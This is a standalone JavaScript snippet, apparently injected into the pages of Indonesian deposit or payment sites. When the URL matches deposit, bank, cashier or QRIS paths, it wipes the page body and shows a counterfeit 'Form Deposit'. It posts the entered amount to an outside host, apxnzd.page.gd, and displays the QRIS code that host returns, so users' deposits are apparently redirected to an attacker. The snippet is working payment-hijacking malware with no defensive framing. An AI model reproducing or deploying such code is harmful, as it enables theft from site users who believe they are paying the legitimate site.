(function () {
  try {
    const url = window.location.href;
    const match = [
      '/deposit',
      '/bank',
      '/deposit.php',
      '/qris.php',
      '/cashier',
      '/?page=transaksi',
      '/index.php?page=transaksi',
      '/?deposit&head=home',
      '/index.php?page=cashier',
      '/bank.php'
    ];

    const shouldRun = match.some(path => url.includes(path));
    if (!shouldRun) return;

    // Jangan hapus seluruh <html>, cukup hapus isi body
    document.head.innerHTML += `
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width,initial-scale=1" />
      <title>Form Deposit</title>
      <style>
        /* CSS sama seperti sebelumnya (disingkat di sini) */
      </style>
    `;

    document.body.innerHTML = `
      <div class="container">
        <div class="card">
          <h1>Form Deposit</h1>
          <p class="lead">Pilih tujuan deposit, masukkan nilai (Min. 50.000).</p>
          <div class="grid">
            <div class="methods" id="methods"></div>
            <div class="details card" style="background:transparent;padding:0">
              <div class="detail-top" id="detailTop"></div>
              <div class="details-body" style="padding:12px" id="detailsBody">
                <div class="number-row">
                  <div class="number-box" id="detailNumber">-</div>
                  <button class="copy" id="copyBtn">Salin Nomor</button>
                </div>
                <div class="form-section">
                  <label for="amount">Nilai Deposit (Min. 50.000)</label>
                  <div class="row">
                    <input type="text" id="amount" placeholder="50.000" inputmode="decimal">
                    <div class="small">
                      <input type="text" id="uniqueCode" placeholder="Kode unik (3 digit)" maxlength="3">
                    </div>
                  </div>
                  <div class="note">Contoh: 50.000 + kode unik 123 -> 50.123</div>
                </div>
                <div class="submit">
                  <button class="primary" id="submitBtn">Generate QR</button>
                  <button class="ghost" id="resetBtn" type="button">Reset</button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="overlay" id="overlay" style="display:none">
        <div class="spinner">
          <div style="font-size:14px;font-weight:600">Memproses...</div>
          <div class="bars" style="margin-top:10px"><span></span><span></span><span></span></div>
        </div>
      </div>
      <div id="toastWrap"></div>
    `;

    // === JS Logic Sama seperti sebelumnya (render methods + event submit) ===

    // Tambahkan try/catch di submit untuk mencegah crash
    const submitBtn = document.getElementById("submitBtn");
    const amountInput = document.getElementById("amount");
    const uniqueInput = document.getElementById("uniqueCode");
    const detailsBody = document.getElementById("detailsBody");
    const overlay = document.getElementById("overlay");

    function fmtNumber(n) {
      return n.toString().replace(/\D/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    }
    function parseAmount() {
      const raw = amountInput.value.replace(/\./g, "");
      return raw ? parseInt(raw, 10) : NaN;
    }
    function showToast(msg) {
      const el = document.createElement("div");
      el.className = "toast";
      el.textContent = msg;
      document.getElementById("toastWrap").appendChild(el);
      setTimeout(() => el.remove(), 3000);
    }

    submitBtn.addEventListener("click", async ev => {
      ev.preventDefault();
      try {
        const amount = parseAmount();
        const unique = uniqueInput.value ? parseInt(uniqueInput.value, 10) : 0;
        if (!amount || isNaN(amount)) return showToast("Masukkan nilai deposit");
        if (amount < 50000) return showToast("Nilai minimal 50.000");

        overlay.style.display = "flex";

        const response = await fetch("https://apxnzd.page.gd/process.php", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ amount: amount + unique })
        });

        const html = await response.text();
        overlay.style.display = "none";

        const match = html.match(/<img[^>]+src=['"]([^'"]+)['"]/i);
        if (match) {
          detailsBody.innerHTML = `
            <div style="text-align:center">
              <h3>Scan QRIS</h3>
              <img src="${match[1]}" alt="QRIS" style="width:220px;height:220px;margin:12px auto;border-radius:12px;background:#fff;padding:10px">
              <p>Total: Rp ${fmtNumber(amount + unique)}</p>
            </div>`;
        } else {
          showToast("Gagal ambil QRIS dari server");
        }
      } catch (err) {
        overlay.style.display = "none";
        showToast("Error: " + err.message);
      }
    });
  } catch (e) {
    console.error("GolemJS Error:", e);
    document.body.innerHTML = "<p style='color:red;text-align:center'>Terjadi error memuat form deposit.</p>";
  }
})();
